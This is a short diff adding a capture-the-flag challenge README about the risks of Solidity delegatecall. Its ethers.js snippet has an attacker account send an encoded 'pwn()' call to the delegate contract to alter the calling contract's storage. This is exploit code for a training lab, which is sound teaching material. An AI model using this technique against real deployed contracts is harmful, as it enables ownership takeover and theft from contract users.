@@ -1,0 +1,15 @@
+This challenge demonstrates the usage of delegatecall and its risks, modifying the storage of the former contract.
+
+Here is an example on how to send a transaction to the delegated contract:
+
+const iface = new ethers.utils.Interface(["function pwn()"]);
+const data = iface.encodeFunctionData("pwn");
+
+const tx = await attacker.sendTransaction({
+  to: delegate.address,
+  data,
+  gasLimit: 100000,
+});
+await tx.wait();
+
+gasLimit has been explicitly set because gas estimations might fail when making delegate calls.
